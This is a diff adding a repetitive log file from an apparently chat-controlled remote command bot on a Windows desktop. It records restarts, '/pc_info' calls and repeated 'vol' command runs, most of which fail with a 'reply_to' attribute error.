@@ -1,0 +1,1412 @@
+
+2020-07-19 10:28:48 - Info: Starting
+2020-07-19 10:28:48 - SUCCESS: Setup done
+2020-07-19 10:28:48 - Info: Starting
+2020-07-19 10:28:48 - SUCCESS: Started
+2020-07-19 10:28:48 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 10:36:01 - Notice: Command /pc_info ran
+2020-07-19 10:36:01 - Notice: Command /pc_info ran
+2020-07-19 10:36:12 - Notice: Command /pc_info ran
+2020-07-19 10:36:12 - Notice: Command /pc_info ran
+2020-07-19 10:36:23 - Notice: Command /pc_info ran
+2020-07-19 10:36:23 - Notice: Command /pc_info ran
+2020-07-19 10:42:45 - Info: Starting
+2020-07-19 10:42:45 - SUCCESS: Setup done
+2020-07-19 10:42:45 - Info: Starting
+2020-07-19 10:42:45 - SUCCESS: Started
+2020-07-19 10:42:45 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 10:43:27 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:43:27 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:43:27 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:43:27 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:43:37 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:43:37 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:43:37 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:43:37 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:43:48 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:43:48 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:43:48 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:43:48 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:43:58 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:43:58 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:43:58 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:43:58 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:44:28 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:44:28 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:44:28 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:44:38 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:44:38 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:44:38 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:44:48 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:44:48 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:44:48 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:44:58 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:44:58 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:44:58 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:44:58 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:44:59 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:44:59 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:45:09 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:45:09 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:45:09 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:45:09 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:45:09 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:45:09 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:45:19 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:45:19 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:45:19 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:45:19 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:45:19 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:45:19 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:45:29 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:45:29 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:45:29 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:45:29 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:45:29 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:45:29 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:45:39 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:45:39 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:45:39 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:45:39 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:45:39 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:45:39 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:45:49 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:45:49 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:45:49 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:45:49 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:45:49 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:45:49 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:45:59 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:45:59 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:45:59 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:45:59 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:45:59 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:45:59 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:46:09 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:46:09 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:46:09 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:46:09 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:46:09 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:46:09 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:46:20 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:46:20 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:46:20 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:46:20 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:46:20 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:46:20 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:46:30 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:46:30 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:46:30 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:46:30 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:46:30 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:46:30 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:46:32 - Info: Starting
+2020-07-19 10:46:32 - SUCCESS: Setup done
+2020-07-19 10:46:32 - Info: Starting
+2020-07-19 10:46:32 - SUCCESS: Started
+2020-07-19 10:46:32 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 10:46:32 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:46:32 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:46:32 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:46:32 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:46:32 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:46:32 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:46:42 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:46:42 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:46:42 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:46:42 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:46:42 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:46:42 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:46:52 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:46:53 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:46:53 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:46:53 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:46:53 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:46:53 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:47:03 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:47:03 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:47:03 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:47:03 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:47:03 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:47:03 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:47:13 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:47:13 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:47:13 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:47:13 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:47:13 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:47:13 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:47:23 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:47:23 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:47:23 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:47:23 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:47:23 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:47:23 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:47:33 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:47:33 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:47:33 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:47:33 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:47:33 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:47:33 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:47:44 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:47:44 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:47:44 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:47:44 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:47:44 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:47:44 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:47:54 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:47:54 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:47:54 - Notice: Command /cmd_exec vol ran
+2020-07-19 10:48:34 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:48:34 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:48:34 - Notice: Command /cmd vol ran
+2020-07-19 10:48:44 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:48:44 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:48:44 - Notice: Command /cmd vol ran
+2020-07-19 10:48:54 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:48:54 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:48:54 - Notice: Command /cmd vol ran
+2020-07-19 10:49:04 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:49:04 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:49:04 - Notice: Command /cmd vol ran
+2020-07-19 10:49:14 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:49:14 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:49:14 - Notice: Command /cmd vol ran
+2020-07-19 10:49:25 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:49:25 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:49:25 - Notice: Command /cmd vol ran
+2020-07-19 10:49:35 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:49:35 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:49:35 - Notice: Command /cmd vol ran
+2020-07-19 10:49:45 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:49:45 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:49:45 - Notice: Command /cmd vol ran
+2020-07-19 10:49:55 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:49:55 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:49:55 - Notice: Command /cmd vol ran
+2020-07-19 10:50:05 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:50:05 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:50:05 - Notice: Command /cmd vol ran
+2020-07-19 10:50:15 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:50:15 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:50:15 - Notice: Command /cmd vol ran
+2020-07-19 10:50:25 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:50:25 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:50:25 - Notice: Command /cmd vol ran
+2020-07-19 10:50:35 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:50:35 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:50:35 - Notice: Command /cmd vol ran
+2020-07-19 10:50:46 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:50:46 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:50:46 - Notice: Command /cmd vol ran
+2020-07-19 10:50:48 - Info: Starting
+2020-07-19 10:50:48 - SUCCESS: Setup done
+2020-07-19 10:50:48 - Info: Starting
+2020-07-19 10:50:48 - SUCCESS: Started
+2020-07-19 10:50:48 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 10:50:48 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:50:48 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:50:48 - Notice: Command /cmd vol ran
+2020-07-19 10:50:59 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:50:59 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:50:59 - Notice: Command /cmd vol ran
+2020-07-19 10:51:09 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:51:09 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:51:09 - Notice: Command /cmd vol ran
+2020-07-19 10:51:19 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:51:19 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:51:19 - Notice: Command /cmd vol ran
+2020-07-19 10:51:29 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:51:29 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:51:29 - Notice: Command /cmd vol ran
+2020-07-19 10:51:39 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:51:39 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:51:39 - Notice: Command /cmd vol ran
+2020-07-19 10:51:49 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:51:49 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:51:49 - Notice: Command /cmd vol ran
+2020-07-19 10:51:59 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:51:59 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:51:59 - Notice: Command /cmd vol ran
+2020-07-19 10:52:09 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:52:09 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:52:09 - Notice: Command /cmd vol ran
+2020-07-19 10:52:19 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:52:19 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:52:19 - Notice: Command /cmd vol ran
+2020-07-19 10:52:29 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:52:29 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:52:29 - Notice: Command /cmd vol ran
+2020-07-19 10:52:39 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:52:39 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:52:39 - Notice: Command /cmd vol ran
+2020-07-19 10:52:49 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:52:49 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:52:49 - Notice: Command /cmd vol ran
+2020-07-19 10:53:00 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:53:00 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:53:00 - Notice: Command /cmd vol ran
+2020-07-19 10:53:10 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:53:10 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:53:10 - Notice: Command /cmd vol ran
+2020-07-19 10:53:20 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:53:20 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:53:20 - Notice: Command /cmd vol ran
+2020-07-19 10:53:31 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:53:31 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:53:31 - Notice: Command /cmd vol ran
+2020-07-19 10:53:41 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:53:41 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:53:41 - Notice: Command /cmd vol ran
+2020-07-19 10:53:51 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:53:51 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:53:51 - Notice: Command /cmd vol ran
+2020-07-19 10:54:01 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:54:01 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:54:01 - Notice: Command /cmd vol ran
+2020-07-19 10:54:11 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:54:11 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:54:11 - Notice: Command /cmd vol ran
+2020-07-19 10:54:21 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:54:21 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:54:21 - Notice: Command /cmd vol ran
+2020-07-19 10:54:31 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:54:31 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:54:31 - Notice: Command /cmd vol ran
+2020-07-19 10:54:41 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:54:41 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:54:41 - Notice: Command /cmd vol ran
+2020-07-19 10:54:52 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:54:52 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:54:52 - Notice: Command /cmd vol ran
+2020-07-19 10:55:02 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:55:02 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:55:02 - Notice: Command /cmd vol ran
+2020-07-19 10:55:12 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:55:12 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:55:12 - Notice: Command /cmd vol ran
+2020-07-19 10:55:22 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:55:22 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:55:22 - Notice: Command /cmd vol ran
+2020-07-19 10:55:32 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:55:32 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:55:32 - Notice: Command /cmd vol ran
+2020-07-19 10:55:42 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:55:42 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:55:42 - Notice: Command /cmd vol ran
+2020-07-19 10:55:52 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:55:52 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:55:52 - Notice: Command /cmd vol ran
+2020-07-19 10:56:03 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:56:03 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:56:03 - Notice: Command /cmd vol ran
+2020-07-19 10:56:13 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:56:13 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:56:13 - Notice: Command /cmd vol ran
+2020-07-19 10:56:23 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:56:23 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:56:23 - Notice: Command /cmd vol ran
+2020-07-19 10:56:33 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:56:33 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:56:33 - Notice: Command /cmd vol ran
+2020-07-19 10:56:43 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:56:43 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:56:43 - Notice: Command /cmd vol ran
+2020-07-19 10:56:53 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:56:53 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:56:53 - Notice: Command /cmd vol ran
+2020-07-19 10:57:04 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:57:04 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:57:04 - Notice: Command /cmd vol ran
+2020-07-19 10:57:14 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:57:14 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:57:14 - Notice: Command /cmd vol ran
+2020-07-19 10:57:24 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:57:24 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:57:24 - Notice: Command /cmd vol ran
+2020-07-19 10:57:34 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:57:34 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:57:34 - Notice: Command /cmd vol ran
+2020-07-19 10:57:44 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:57:44 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:57:44 - Notice: Command /cmd vol ran
+2020-07-19 10:57:54 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:57:54 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:57:54 - Notice: Command /cmd vol ran
+2020-07-19 10:58:05 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:58:05 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:58:05 - Notice: Command /cmd vol ran
+2020-07-19 10:58:15 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:58:15 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:58:15 - Notice: Command /cmd vol ran
+2020-07-19 10:58:25 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:58:25 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:58:25 - Notice: Command /cmd vol ran
+2020-07-19 10:58:35 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:58:35 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:58:35 - Notice: Command /cmd vol ran
+2020-07-19 10:58:45 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:58:45 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:58:45 - Notice: Command /cmd vol ran
+2020-07-19 10:58:56 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:58:56 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:58:56 - Notice: Command /cmd vol ran
+2020-07-19 10:59:06 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:59:06 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:59:06 - Notice: Command /cmd vol ran
+2020-07-19 10:59:16 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:59:16 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:59:16 - Notice: Command /cmd vol ran
+2020-07-19 10:59:26 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:59:26 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:59:26 - Notice: Command /cmd vol ran
+2020-07-19 10:59:36 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:59:36 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:59:36 - Notice: Command /cmd vol ran
+2020-07-19 10:59:47 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:59:47 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:59:47 - Notice: Command /cmd vol ran
+2020-07-19 10:59:57 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 10:59:57 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 10:59:57 - Notice: Command /cmd vol ran
+2020-07-19 11:00:07 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:00:07 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:00:07 - Notice: Command /cmd vol ran
+2020-07-19 11:00:17 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:00:17 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:00:17 - Notice: Command /cmd vol ran
+2020-07-19 11:00:27 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:00:27 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:00:28 - Notice: Command /cmd vol ran
+2020-07-19 11:00:38 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:00:38 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:00:38 - Notice: Command /cmd vol ran
+2020-07-19 11:00:48 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:00:48 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:00:48 - Notice: Command /cmd vol ran
+2020-07-19 11:00:58 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:00:58 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:07:28 - Info: Starting
+2020-07-19 11:07:28 - SUCCESS: Setup done
+2020-07-19 11:07:28 - Info: Starting
+2020-07-19 11:07:28 - SUCCESS: Started
+2020-07-19 11:07:28 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:07:28 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:07:28 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:07:28 - Notice: Command /cmd vol ran
+2020-07-19 11:07:38 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:07:38 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
